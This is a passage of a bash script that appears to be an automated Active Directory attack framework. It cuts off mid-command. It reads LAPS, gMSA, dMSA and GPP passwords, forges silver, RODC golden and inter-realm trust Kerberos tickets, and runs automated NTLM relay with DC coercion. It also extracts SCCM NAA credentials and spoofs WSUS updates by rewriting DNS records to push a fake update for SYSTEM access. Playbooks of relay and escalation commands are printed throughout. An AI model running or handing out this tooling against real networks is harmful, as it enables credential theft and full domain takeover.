        run "impacket-ticketer -nthash <dc\$> -domain-sid $sid -domain $DOMAIN -spn cifs/$DC_FQDN Administrator"
        ( cd "$OUTDIR" && impacket-ticketer -nthash "$dchash" -domain-sid "$sid" -domain "$DOMAIN" \
            -spn "cifs/${DC_FQDN}" Administrator >/dev/null 2>&1 \
            && mv -f Administrator.ccache silver_cifs_Administrator.ccache 2>/dev/null )
        [[ -f "$OUTDIR/silver_cifs_Administrator.ccache" ]] \
            && loot "★ Silver ticket forged (cifs/${DC_FQDN}) → silver_cifs_Administrator.ccache"
    fi
}

# ===========================================================================
#  SECRETS  —  LAPS + gMSA  (quick, high-value reads)
# ===========================================================================
phase_secrets() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "SECRETS · LAPS & gMSA READS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → LAPS/gMSA reads need LDAP, skipping"; return; }
    local args; mapfile -t args < <(nxc_cred_args)

    subsection "LAPS — local admin passwords readable by this account"
    run "$NXC ldap $DCT ${args[*]} -M laps"
    local laps; laps=$($NXC ldap "$DCT" "${args[@]}" -M laps 2>&1); echo "$laps" | tee -a "$LOGFILE"
    echo "$laps" | grep -iE 'Computer:|Password:' >"$OUTDIR/laps.txt"
    if grep -qi 'Password:' "$OUTDIR/laps.txt" 2>/dev/null; then
        loot "★ LAPS passwords readable! → laps.txt (local admin on those hosts)"
    fi

    subsection "GPP passwords (cpassword in SYSVOL — classic AD leak)"
    run "$NXC smb $DCT ${args[*]} -M gpp_password"
    $NXC smb "$DCT" "${args[@]}" -M gpp_password 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/gpp.txt"
    while read -r p; do
        [[ -n "$p" ]] && { loot "GPP cpassword recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "GPP cpassword (SYSVOL)"; }
    done < <(grep -oiP 'password:\s*\K\S+' "$OUTDIR/gpp.txt" 2>/dev/null)

    subsection "gMSA — group Managed Service Account hashes"
    run "$NXC ldap $DCT ${args[*]} --gmsa"
    local gmsa; gmsa=$($NXC ldap "$DCT" "${args[@]}" --gmsa 2>&1); echo "$gmsa" | tee -a "$LOGFILE"
    echo "$gmsa" | grep -iE 'Account:|NTLM:' >"$OUTDIR/gmsa.txt"
    # Queue any gMSA account whose NT hash we recovered. Parse each line as a unit:
    # the account ends in '$' (machine account), so the old `grep -i "$acc"` lookup
    # treated that '$' as a regex end-anchor and never matched → the hash was
    # dropped and the gMSA account (ending in '$') never got pivoted.
    while IFS= read -r line; do
        local acc h
        acc=$(grep -oiP 'Account:\s*\K\S+'        <<<"$line" | head -1)
        h=$(grep -oiP 'NTLM:\s*\K[a-fA-F0-9]{32}' <<<"$line" | head -1)
        [[ -n "$acc" && -n "$h" ]] && {
            loot "★ gMSA hash recovered for ${C_BOLD}$acc${C_RESET}: ${C_MAGENTA}$h${C_RESET}"
            note_cred_source "$acc" "gMSA password read (NT hash)"
            queue_cred "$acc" "" "$h" "ReadGMSAPassword"; }
    done < <(echo "$gmsa" | grep -iE 'Account:.*NTLM:')

    subsection "dMSA — delegated Managed Service Account hashes (opportunistic)"
    if ! nxc_has_module ldap dmsa; then
        info "NetExec dMSA module not available in this install → LDAP surface enum only"
        return
    fi
    run "$NXC ldap $DCT ${args[*]} -M dmsa"
    local dmsa; dmsa=$($NXC ldap "$DCT" "${args[@]}" -M dmsa 2>&1); echo "$dmsa" | tee -a "$LOGFILE" | tee "$OUTDIR/dmsa.txt"
    while IFS= read -r line; do
        local acc h
        acc=$(grep -oiP 'Account:\s*\K\S+'        <<<"$line" | head -1)
        h=$(grep -oiP 'NTLM:\s*\K[a-fA-F0-9]{32}' <<<"$line" | head -1)
        [[ -n "$acc" && -n "$h" ]] && {
            loot "★ dMSA hash recovered for ${C_BOLD}$acc${C_RESET}: ${C_MAGENTA}$h${C_RESET}"
            note_cred_source "$acc" "dMSA password read (NT hash)"
            queue_cred "$acc" "" "$h" "ReadDMSAPassword"; }
    done < <(echo "$dmsa" | grep -iE 'Account:.*NTLM:')
}

# ===========================================================================
#  NTLM RELAY & COERCION  —  detect relay/coercion conditions, give playbook
#  (relaying is interactive: we DETECT + hand you the exact commands, we don't
#   blindly fire listeners mid-scan)
# ===========================================================================
RELAY_DONE=0
phase_relay() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
    # SMB/LDAP signing, coercion vectors, spooler/webdav and the relay playbook are
    # DC-wide facts — identical for every identity. Assess once, not per pivot.
    [[ "$RELAY_DONE" == "1" ]] && return
    RELAY_DONE=1
    section "NTLM RELAY & COERCION ASSESSMENT"
    local args; mapfile -t args < <(nxc_cred_args)
    local lhost; lhost="$(attacker_ip)"

    subsection "SMB signing (relay to SMB viable only if NOT required)"
    local s; s=$($NXC smb "$DCT" "${args[@]}" 2>&1 | head -1); echo "$s" | tee -a "$LOGFILE"
    if echo "$s" | grep -qi 'signing:False'; then loot "★ SMB signing NOT required → NTLM relay to SMB possible"
    else info "SMB signing required (typical on a DC) — SMB relay blocked here"; fi

    if [[ "$CAP_LDAP" == "1" ]]; then
        subsection "LDAP signing & channel binding (relay → LDAP: RBCD / shadow creds / ESC8)"
        # ldap-checker resolves the target's FQDN itself. If it isn't resolvable
        # (no /etc/hosts entry / no DNS) it throws a stacktrace — fall back to the
        # DC IP as target so the module actually runs.
        local ltgt="$DCT"
        if [[ "$DCT" == "$DC_FQDN" ]] && ! getent hosts "$DC_FQDN" >/dev/null 2>&1; then
            ltgt="$DC_IP"; info "FQDN $DC_FQDN not resolvable → using $DC_IP for ldap-checker"
        fi
        run "$NXC ldap $ltgt ${args[*]} -M ldap-checker"
        $NXC ldap "$ltgt" "${args[@]}" -M ldap-checker 2>&1 \
            | grep -avE 'Traceback|File \"|    [│┃|]|self\.|raise |[A-Za-z]+Error:|connection\.py' \
            | tee -a "$LOGFILE" | tee "$OUTDIR/relay_ldap.txt"
        # Only read the LDAP-CHECKER verdict lines (avoid matching 'SMBv1:False' etc.)
        local lc; lc=$(grep -i 'LDAP-CHE' "$OUTDIR/relay_ldap.txt")
        if echo "$lc" | grep -qiE 'Connection fail|Name or service|Errno|timed out|error'; then
            warn "ldap-checker could not run (Kerberos/DNS) → LDAP signing status UNKNOWN, verify manually"
        elif echo "$lc" | grep -qiE 'not (enforced|required)'; then
            loot "★ LDAP signing/channel-binding NOT enforced → relay to LDAP available (RBCD / shadow / ESC8)"
        elif echo "$lc" | grep -qiE 'enforced|required'; then
            info "LDAP signing / channel binding appears enforced — LDAP relay blocked"
        else
            info "LDAP signing status inconclusive — see relay_ldap.txt"
        fi
    fi

    subsection "Coercion vectors (force the DC to authenticate to us)"
    run "$NXC smb $DCT ${args[*]} -M coerce_plus"
    $NXC smb "$DCT" "${args[@]}" -M coerce_plus 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/coerce.txt"
    grep -qiE 'VULNERABLE|is vuln|Success' "$OUTDIR/coerce.txt" 2>/dev/null \
        && loot "★ DC is coercible (PetitPotam/PrinterBug/DFSCoerce/MS-EVEN) → trigger auth for relay"
    $NXC smb "$DCT" "${args[@]}" -M spooler 2>&1 | tee -a "$LOGFILE" | grep -qi 'enabled' \
        && loot "★ Print Spooler enabled → PrinterBug (MS-RPRN) coercion available"
    $NXC smb "$DCT" "${args[@]}" -M webdav  2>&1 | tee -a "$LOGFILE" | grep -qi 'running\|enabled' \
        && loot "★ WebClient (WebDAV) running → HTTP coercion → relay to LDAP/ADCS"

    if [[ "$DO_ABUSE" == "1" && "${AUTO_RELAY:-0}" == "1" ]]; then
        if [[ -z "$lhost" ]]; then
            warn "AUTO_RELAY requested but no callback IP was found. Export LHOST=<tun0/vpn ip>."
        elif have impacket-ntlmrelayx; then
            subsection "AUTO RELAY · ntlmrelayx + coerce_plus"
            warn "Starting time-boxed LDAP relay. This needs free SMB/HTTP listener ports and a coercible target."
            run "impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --delegate-access --no-dump"
            ( cd "$OUTDIR" && timeout -k 10 "${AUTO_RELAY_TIMEOUT:-75}" impacket-ntlmrelayx -t "ldaps://$DC_IP" -smb2support --delegate-access --no-dump 2>&1 | tee -a "$LOGFILE" | tee auto_relay_ntlmrelayx.log ) &
            local rpid=$!
            sleep 4
            run "$NXC smb $DCT ${args[*]} -M coerce_plus -o LISTENER=$lhost"
            $NXC smb "$DCT" "${args[@]}" -M coerce_plus -o LISTENER="$lhost" 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/auto_relay_coerce.txt"
            wait "$rpid" 2>/dev/null || true
            grep -qiE 'Delegation rights modified|Success|Authenticat|Adding a computer' "$OUTDIR/auto_relay_ntlmrelayx.log" 2>/dev/null \
                && loot "★ Auto relay produced a useful LDAP action → auto_relay_ntlmrelayx.log" \
                || warn "Auto relay did not capture/modify anything in the time window"
        else
            warn "AUTO_RELAY requested but impacket-ntlmrelayx is not installed"
        fi
    elif [[ "$DO_ABUSE" == "1" ]]; then
        info "Relay/coercion needs a live listener. For automatic attempt: AUTO_RELAY=1 LHOST=${lhost:-<ip>} $0 ..."
    fi

    subsection "Relay playbook (run these yourself — needs your listener)"
    local ip="${lhost:-<your-ip>}" ca="${DC_FQDN:-$DCT}"
    echo -e "      ${C_GREY}# Start ONE relay listener (target must be a DIFFERENT host than the one you coerce):${C_RESET}"
    echo -e "      ${C_GREY}# (A) ADCS web enrollment → cert for the relayed machine (ESC8, most reliable if HTTP/S enrolment is up):${C_RESET}"
    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t http://$ca/certsrv/certfnsh.asp -smb2support --adcs --template DomainController${C_RESET}"
    echo -e "      ${C_GREY}# (B) LDAP → RBCD (adds a computer + delegation on the relayed machine account):${C_RESET}"
    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --delegate-access --no-dump${C_RESET}"
    echo -e "      ${C_GREY}# (C) LDAP → grant a user DCSync (relay a privileged account/DC):${C_RESET}"
    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --escalate-user '$USER'${C_RESET}"
    echo -e "      ${C_GREY}# (D) LDAP → Shadow Credentials on the relayed account:${C_RESET}"
    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --shadow-credentials --shadow-target '<victim>'${C_RESET}"
    echo -e "      ${C_GREY}# Then COERCE the DC to authenticate to you ($ip):${C_RESET}"
    echo -e "      ${C_CYAN}coercer coerce -u '$USER' -p '<pass>' -d $DOMAIN -l $ip -t $DC_IP${C_RESET}"
    echo -e "      ${C_GREY}# or: petitpotam.py / printerbug.py / dfscoerce.py · passive: ${C_CYAN}sudo responder -I <iface>${C_RESET}"
}

# ===========================================================================
#  DOMAIN / FOREST TRUSTS  —  enumerate and surface cross-forest attack paths
# ===========================================================================
TRUSTS_DONE=0
phase_trusts() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    # Domain/forest trusts are domain-wide — same for every identity. Enumerate once.
    [[ "$TRUSTS_DONE" == "1" ]] && return
    TRUSTS_DONE=1
    section "TRUSTS · DOMAIN & CROSS-FOREST RELATIONSHIPS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → trust enumeration needs LDAP, skipping"; return; }
    local args; mapfile -t args < <(nxc_cred_args)
    local tf="$OUTDIR/trusts.txt"; : >"$tf"

    subsection "Enumerating trust relationships"
    # Primary: bloodyAD (clean, shows direction + type + transitivity)
    if have bloodyAD; then
        local ba; mapfile -t ba < <(bloody_args)
        run "bloodyAD ${ba[*]} get trusts"
        bloodyAD "${ba[@]}" get trusts 2>&1 | tee -a "$LOGFILE" | tee -a "$tf"
    fi
    # Second source: netexec module
    run "$NXC ldap $DCT ${args[*]} -M enum_trusts"
    $NXC ldap "$DCT" "${args[@]}" -M enum_trusts 2>&1 | tee -a "$LOGFILE" | tee -a "$tf"
    # Raw fallback: trustedDomain objects via LDAP
    if [[ -n "$DOMAIN" ]]; then
        local base="dc=${DOMAIN//./,dc=}"
        ldapsearch -x -H "ldap://$DC_IP" -b "$base" "(objectClass=trustedDomain)" \
            trustPartner trustDirection trustType trustAttributes flatName 2>/dev/null \
            | grep -iE 'trustPartner|trustDirection|trustType|trustAttributes|flatName' | tee -a "$tf"
    fi

    # Identify partner domains
    local partners; partners=$(grep -oiP 'trustPartner:\s*\K\S+' "$tf" 2>/dev/null | sort -u)
    [[ -z "$partners" ]] && partners=$(grep -oiP '(Target|Partner|Domain)\s*:?\s*\K[a-z0-9.-]+\.[a-z]{2,}' "$tf" 2>/dev/null | sort -u)
    # Drop the current domain. bloodyAD/enum_trusts/ldapsearch all echo our own
    # name (and FSP DNs like DC=corp,DC=local), and the loose fallback regex
    # would otherwise mistake it for a "trust" → we'd kerberoast ourselves and
    # print bogus cross-forest paths. A single-domain forest has no partners.
    partners=$(printf '%s\n' "$partners" | grep -vixF "$DOMAIN" | grep -vE '^[[:space:]]*$')

    if [[ -z "$partners" ]]; then
        info "No external/forest trusts found from this domain"
        return
    fi

    loot "Trust relationship(s) discovered:"
    echo "$partners" | while read -r d; do echo -e "      ${C_CYAN}↔${C_RESET} ${C_BOLD}$d${C_RESET}"; done

    subsection "Foreign Security Principals (accounts from trusted domains with access here)"
    if have bloodyAD; then
        local ba; mapfile -t ba < <(bloody_args)
        local fsp; fsp=$(bloodyAD "${ba[@]}" get search --filter '(objectClass=foreignSecurityPrincipal)' --attr cn 2>&1)
        printf '%s\n' "$fsp" >>"$tf"
        # Only real foreign principals are domain SIDs (S-1-5-21-…). Every domain
        # also has built-in well-known SIDs in this container (S-1-5-4 Interactive,
        # S-1-5-9 Enterprise DCs, S-1-5-11 Authenticated Users, S-1-5-17 IUSR…) —
        # they're not actionable, so don't surface them as "foreign access".
        local realfsp; realfsp=$(grep -oiE 'S-1-5-21-[0-9-]+' <<<"$fsp" | sort -u)
        if [[ -n "$realfsp" ]]; then
            while read -r s; do echo -e "      ${C_CYAN}$s${C_RESET}"; done <<<"$realfsp"
        else
            info "Only built-in well-known SIDs present — no actionable foreign principals"
        fi
    fi

    subsection "Cross-forest exploitation paths"
    info "Reviewing each trust for actionable abuse:"
    echo "$partners" | while read -r pd; do
        [[ -z "$pd" ]] && continue
        echo -e "    ${C_PURPLE}▸ Trust toward ${C_BOLD}$pd${C_RESET}"
        echo -e "      ${C_GREY}- Cross-forest Kerberoast:${C_RESET} impacket-GetUserSPNs ${DOMAIN}/${USER} -target-domain $pd -request -dc-ip $DC_IP"
        echo -e "      ${C_GREY}- Foreign group membership / ACLs in $pd (check BloodHound 'Cross-domain')${C_RESET}"
        echo -e "      ${C_GREY}- If bidirectional + SIDHistory not filtered → SID History / inter-realm TGT abuse${C_RESET}"
        # Attempt cross-forest kerberoast automatically (read-only, high value)
        if have impacket-GetUserSPNs && [[ -n "$KERB_TICKET" ]]; then
            run "cross-forest kerberoast against $pd"
            KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "${DOMAIN}/${USER}" -k -no-pass \
                -dc-host "${DC_FQDN:-$DC_IP}" -target-domain "$pd" -request \
                -outputfile "$OUTDIR/kerberoast_xforest_${pd}.txt" 2>&1 | tee -a "$LOGFILE"
            [[ -s "$OUTDIR/kerberoast_xforest_${pd}.txt" ]] && \
                loot "★ Cross-forest Kerberoast hashes from $pd → kerberoast_xforest_${pd}.txt"
        fi
        # SID-history / inter-realm golden trust ticket: only ABUSABLE once we're DA
        # here AND hold the inter-realm trust key (dump it via DCSync of the TDO).
        if [[ "$IS_DC_ADMIN" == "1" ]]; then
            local tkey psid
            tkey=$(grep -iE "(\\[in\\]|\\[out\\]|trust).*${pd%%.*}|^${pd%%.*}\\\$:" "$OUTDIR/secretsdump.txt" 2>/dev/null | grep -oiE '[0-9a-f]{32}' | head -1)
            if [[ -n "$tkey" ]] && have impacket-ticketer; then
                loot "★ Trust key for $pd in hand → forging inter-realm golden trust ticket (SID history)"
                psid=$( impacket-lookupsid "${DOMAIN}/${USER}@${pd}" -hashes ":${HASH:-}" 2>/dev/null | grep -oiP 'Domain SID is:\s*\KS-1-5-21-[0-9-]+' | head -1 )
                local osid; osid=$(grep -oiE 'S-1-5-21-[0-9-]+' "$OUTDIR/secretsdump.txt" | head -1)
                ( cd "$OUTDIR" && impacket-ticketer -nthash "$tkey" -domain-sid "$osid" -domain "$DOMAIN" \
                    ${psid:+-extra-sid "${psid}-519"} Administrator >/dev/null 2>&1 \
                    && mv -f Administrator.ccache "trust_${pd}_Administrator.ccache" 2>/dev/null )
                [[ -f "$OUTDIR/trust_${pd}_Administrator.ccache" ]] \
                    && loot "★ Inter-realm trust ticket → trust_${pd}_Administrator.ccache (EA on $pd)"
            else
                echo -e "      ${C_GREY}- SID History / inter-realm TGT (DA here + trust key needed):${C_RESET}"
                echo -e "        ${C_CYAN}impacket-ticketer -nthash <trust_key> -domain-sid <THIS_SID> -domain $DOMAIN -extra-sid <${pd}_SID>-519 Administrator${C_RESET}"
            fi
        else
            echo -e "      ${C_GREY}- If bidirectional + SIDHistory not filtered → SID History / inter-realm TGT (needs DA here first)${C_RESET}"
        fi
    done
}

# ===========================================================================
#  RODC ABUSE  —  Read-Only DC key abuse. PRECONDITION-GATED: only meaningful if
#  an RODC exists, and only AUTO-abusable once we hold that RODC's own krbtgt
#  (krbtgt_<RID>) — then we can forge RODC-scoped golden tickets. Otherwise it
#  reports the RODC + the accounts it may cache + an accurate playbook. No RODC
#  in the domain → it no-ops. Runs once per run.
# ===========================================================================
RODC_DONE=0
phase_rodc_abuse() {
    [[ "$DO_ABUSE" != "1" || "$RODC_DONE" == "1" ]] && return
    [[ "$CAP_LDAP" != "1" || -z "$DOMAIN" ]] && return
    RODC_DONE=1
    local base="dc=${DOMAIN//./,dc=}" rodc="" filt='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))'
    local -a attrs=(sAMAccountName dNSHostName msDS-RevealOnDemandGroup msDS-KrbTgtLink)
    if   [[ -n "$KERB_TICKET" ]]; then rodc=$(KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" "$filt" "${attrs[@]}" 2>/dev/null)
    elif [[ -n "$PASS" ]];       then rodc=$(ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" "$filt" "${attrs[@]}" 2>/dev/null)
    fi
    [[ -z "$rodc" ]] && { info "No RODC in this domain → RODC abuse N/A"; return; }

    section "RODC ABUSE · read-only DC key abuse"
    local rname rkt; rname=$(grep -oiP 'sAMAccountName:\s*\K\S+' <<<"$rodc" | head -1)
    rkt=$(grep -oiP 'msDS-KrbTgtLink:\s*CN=\K[^,]+' <<<"$rodc" | head -1)
    loot "RODC present: ${C_BOLD}${rname}${C_RESET}  (its krbtgt: ${rkt:-krbtgt_<RID>})"
    grep -oiP 'msDS-RevealOnDemandGroup:\s*\K.*' <<<"$rodc" | while read -r g; do detail "      Allowed-to-cache: $g"; done

    local rkt_hash=""
    [[ -n "$rkt" ]] && rkt_hash=$(grep -iE "^${rkt}:" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f4)
    if [[ -n "$rkt_hash" ]] && have impacket-ticketer; then
        local sid; sid=$(grep -oiE 'S-1-5-21-[0-9-]+' "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1)
        loot "★ We hold the RODC krbtgt (${rkt}) → forging RODC golden ticket"
        ( cd "$OUTDIR" && impacket-ticketer -nthash "$rkt_hash" -domain-sid "${sid:-S-1-5-21-0-0-0}" -domain "$DOMAIN" Administrator >/dev/null 2>&1 \
            && mv -f Administrator.ccache rodc_golden_Administrator.ccache 2>/dev/null )
        [[ -f "$OUTDIR/rodc_golden_Administrator.ccache" ]] && loot "★ RODC golden ticket → rodc_golden_Administrator.ccache"
    else
        info "Not auto-abusable yet: need the RODC krbtgt hash (${rkt:-krbtgt_<RID>})."
        detail "      # compromise the RODC, then dump its own krbtgt and forge:"
        detail "      impacket-secretsdump <rodc_admin>@${rname%\$}   # → ${rkt:-krbtgt_<RID>} hash"
        detail "      impacket-ticketer -nthash <rodc_krbtgt> -domain-sid <SID> -domain ${DOMAIN} <allowed_account>"
    fi
}

# ===========================================================================
#  SCCM / MECM ABUSE  —  PRECONDITION-GATED on SCCM actually existing in AD.
#  Discovery via `nxc -M sccm`; if a Management Point / site server is present we
#  (under --abuse) try the credential-without-shell primitive: extract the Network
#  Access Account via sccmhunter (find→http) and feed it back into the engine.
#  No SCCM in AD → no-op. Listener-based ELEVATE/TAKEOVER paths get a dynamic-IP
#  playbook (they need a relay listener, like the NTLM relay path). Runs once.
# ===========================================================================
SCCM_DONE=0
phase_sccm() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
    [[ "$SCCM_DONE" == "1" ]] && return
    SCCM_DONE=1
    local args; mapfile -t args < <(nxc_cred_args)
    local sf="$OUTDIR/sccm.txt"
    $NXC ldap "$DCT" "${args[@]}" -M sccm 2>&1 | tee -a "$LOGFILE" | tee "$sf" >/dev/null
    if ! grep -qiE 'Management Point|Site ?Server|Site Code|SCCM.*(found|server|site)|mSSMS' "$sf" 2>/dev/null; then
        info "No SCCM/MECM infrastructure in AD → SCCM abuse N/A"
        return
    fi
    section "SCCM / MECM ABUSE · NAA credentials + relay surface"
    grep -iE 'Management Point|Site ?Server|Site Code|Distribution|SCCM' "$sf" | sed 's/^/      /' | head -20
    local mp; mp=$(grep -oiP '(Management Point|MP Name|Site ?Server)[^A-Za-z0-9]*\K[A-Za-z0-9._-]+\.[A-Za-z0-9.-]+' "$sf" | head -1)
    [[ -n "$mp" ]] && loot "SCCM Management Point/Site server: ${C_BOLD}$mp${C_RESET}"

    local ip; ip="$(attacker_ip)"
    local sh; sh="$(external_tool sccmhunter/sccmhunter.py)"

    # CRED primitive: Network Access Account via the MP policy (no shell needed).
    if [[ "$DO_ABUSE" == "1" && -n "$sh" ]] && { [[ -n "$PASS" || -n "$HASH" ]]; }; then
        subsection "NAA credential extraction (sccmhunter find → http)"
        local sa=(-u "$USER" -d "$DOMAIN" -dc-ip "$DC_IP")
        [[ -n "$PASS" ]] && sa+=(-p "$PASS"); [[ -n "$HASH" ]] && sa+=(-hashes ":${HASH##*:}")
        local nao="$OUTDIR/sccm_naa.txt"
        ( cd "$(dirname "$sh")" && python3 "$sh" find "${sa[@]}" 2>&1; python3 "$sh" http "${sa[@]}" 2>&1 ) \
            | tee -a "$LOGFILE" | tee "$nao"
        local nu np
        nu=$(grep -oiP 'Username\s*:\s*\K\S+' "$nao" 2>/dev/null | head -1 | sed 's#.*\\##')
        np=$(grep -oiP 'Password\s*:\s*\K\S.*'  "$nao" 2>/dev/null | head -1 | tr -d '\r')
        if [[ -n "$np" ]] && _plausible_secret "$np"; then
            loot "★★ SCCM NAA credential recovered → ${C_GREEN}${nu:-?} : ${np}${C_RESET}"
            add_secret "$np" "SCCM NAA"
            [[ -n "$nu" ]] && { note_cred_source "${nu}:${np}" "SCCM NAA extraction"; queue_cred "$nu" "$np" "" "SCCM NAA"; }
        else
            info "No NAA credential returned (MP may enforce HTTPS/PKI, or none configured)"
        fi
    elif [[ "$DO_ABUSE" == "1" && -z "$sh" ]]; then
        info "sccmhunter not vendored → NAA auto-extraction skipped (install.sh clones it)"
    fi

    # ELEVATE/TAKEOVER need a relay listener → dynamic-IP playbook (Misconfiguration Manager).
    subsection "SCCM escalation / takeover playbook (listener-based; you run these)"
    detail "  # listener IP auto-derived: ${ip:-<your-ip>}"
    detail "  # CRED-1 NAA:        python3 ${sh:-sccmhunter.py} http -u $USER -p '<pass>' -d $DOMAIN -dc-ip $DC_IP"
    detail "  # ELEVATE-2 takeover: coerce the site server to you (${ip:-<ip>}) and relay to the site DB / AdminService:"
    detail "  #   impacket-ntlmrelayx -t mssql://<siteDB> -smb2support -q '<grant full admin>'   # or -t http://<SMSProvider>/AdminService --adcs"
    detail "  #   then: python3 ${sh:-sccmhunter.py} admin -u <you> -p '<pass>' -ip <SMSProvider>  → add 'Full Administrator'"
}

# ===========================================================================
#  WSUS ABUSE  —  update spoofing. PRECONDITION-GATED on WSUS being present AND
#  reachable over HTTP (no SSL): only then is it spoofable (a client pulling
#  updates over HTTP can be served a malicious "update" = SYSTEM). The PORT is
#  derived from the SERVICE — parsed from the WSUS SPN if it carries one, else the
#  open WSUS port is auto-detected by probing — never hard-assumed. HTTPS-only or
#  absent → not auto-abusable. The exploit needs a MITM position between a client
#  and WSUS (ARP / ADIDNS+WPAD / DHCP) → dynamic-IP PyWSUS playbook. Runs once.
# ===========================================================================
WSUS_DONE=0
phase_wsus() {
    [[ "$WSUS_DONE" == "1" || -z "$DC_IP" ]] && return
    WSUS_DONE=1

    # Find the WSUS host + SPN via LDAP (the SERVICE tells us host and, often, port).
    local base="dc=${DOMAIN//./,dc=}" wfind="" wsrv=""
    if [[ "$CAP_LDAP" == "1" && -n "$DOMAIN" ]]; then
        if   [[ -n "$KERB_TICKET" ]]; then wfind=$(KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" '(|(servicePrincipalName=*WSUS*)(cn=*WSUS*))' dNSHostName servicePrincipalName 2>/dev/null)
        elif [[ -n "$PASS" ]];       then wfind=$(ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" '(|(servicePrincipalName=*WSUS*)(cn=*WSUS*))' dNSHostName servicePrincipalName 2>/dev/null); fi
        wsrv=$(grep -oiP 'dNSHostName:\s*\K\S+' <<<"$wfind" | head -1)
    fi
    local probe="${wsrv:-$DC_IP}"

    # Port IN FUNCTION OF THE SERVICE: take it from the SPN if present (e.g.
    # HTTP/host:8530), otherwise auto-detect by probing the WSUS ports and using
    # whichever the service is actually listening on. Nothing hard-assumed.
    local -a cand=(); local spn_port; spn_port=$(grep -oiP 'servicePrincipalName:.*?:\K[0-9]{2,5}' <<<"$wfind" | head -1)
    [[ -n "$spn_port" ]] && cand+=("$spn_port"); cand+=(8530 8531)
    local wport="" wscheme="" p seen=""
    for p in "${cand[@]}"; do
        [[ " $seen " == *" $p "* ]] && continue; seen+=" $p"
        timeout 3 bash -c "exec 3<>/dev/tcp/$probe/$p" 2>/dev/null || continue
        wport="$p"; case "$p" in 8531|443) wscheme="https";; *) wscheme="http";; esac; break
    done

    local wsus_share=0
    grep -qiE 'WSUSTemp|Remote WSUS Console' "$OUTDIR"/*.txt "$LOGFILE" 2>/dev/null && wsus_share=1

    if [[ -z "$wport" && -z "$wsrv" && "$wsus_share" == 0 ]]; then
        info "No WSUS detected (no WSUS SPN, no open WSUS port, no WSUSTemp) → WSUS abuse N/A"
        return
    fi

    section "WSUS ABUSE · update spoofing (malicious update = SYSTEM on clients)"
    [[ -n "$wsrv" ]] && loot "WSUS server (LDAP): ${C_BOLD}$wsrv${C_RESET}"
    [[ "$wsus_share" == 1 ]] && info "WSUSTemp share present → WSUS role confirmed on a host here"
    [[ -n "$wport" ]] && info "WSUS service detected on ${probe}:${wport} (${wscheme})"
    local ip; ip="$(attacker_ip)"; local pw; pw="$(external_tool pywsus/pywsus.py)"

    if [[ "$wscheme" == "http" ]]; then
        loot "★ WSUS on HTTP :${wport} (no SSL) → SPOOFABLE: a client pulling updates over HTTP can be pushed a fake update = SYSTEM"

        # AUTO — but ONLY if we actually hold the PERMISSION. The permission for the
        # DNS-redirect spoof is DNS-write over the WSUS host: we TEST it by adding the
        # record; if it is denied we do nothing automatic and fall back to the playbook.
        # Also needs a Microsoft-SIGNED carrier (e.g. PsExec64.exe). We can't ship it,
        # but it's served by Microsoft's own Sysinternals Live — fetch it automatically.
        local carrier dx wlabel="${wsrv%%.*}" dauth
        carrier=$(ls "$OUTDIR"/PsExec*.exe ./PsExec*.exe 2>/dev/null | head -1)
        if [[ -z "$carrier" && "$DO_ABUSE" == "1" ]] && have curl; then
            info "Fetching a Microsoft-signed carrier (PsExec64.exe) from Sysinternals Live…"
            if curl -fsSL -o "$OUTDIR/PsExec64.exe" https://live.sysinternals.com/PsExec64.exe 2>/dev/null \
               && [[ -s "$OUTDIR/PsExec64.exe" ]]; then
                carrier="$OUTDIR/PsExec64.exe"; ok "Carrier downloaded → PsExec64.exe"
            else
                rm -f "$OUTDIR/PsExec64.exe" 2>/dev/null
                info "Could not auto-download PsExec64.exe (offline?) — drop it in $OUTDIR manually."
            fi
        fi
        dx="$(external_tool krbrelayx/dnstool.py)"
        if [[ "$DO_ABUSE" == "1" && -n "$pw" && -n "$dx" && -n "$ip" && -n "$wsrv" && -n "$carrier" ]] \
           && { [[ -n "$PASS" || -n "$HASH" ]]; }; then
            dauth=$( [[ -n "$PASS" ]] && echo "-p $PASS" || echo "-hashes :${HASH##*:}" )
            subsection "AUTO WSUS spoof · permission test (ADIDNS write) → PyWSUS"
            warn "Disruptive: repoints WSUS host '$wlabel' to you ($ip) and serves a fake update. Rollback-tracked, time-boxed."
            local addout; addout=$(python3 "$dx" -u "${DOMAIN}\\${USER}" $dauth -r "$wlabel" -a add -d "$ip" "$DC_IP" 2>&1)
            echo "$addout" | tee -a "$LOGFILE"
            if grep -qiE 'success|added|Result: 0|LDAP operation.*succe' <<<"$addout"; then
                loot "★ Permission CONFIRMED (DNS write over '$wlabel') → auto-spoofing"
                rb_record "ADIDNS WSUS redirect: $wlabel -> $ip" "python3 $dx -u '${DOMAIN}\\${USER}' $dauth -r '$wlabel' -a remove $DC_IP"
                ( cd "$OUTDIR" && timeout -k 10 "${WSUS_TIMEOUT:-180}" python3 "$pw" -H "$ip" -p "$wport" -e "$carrier" \
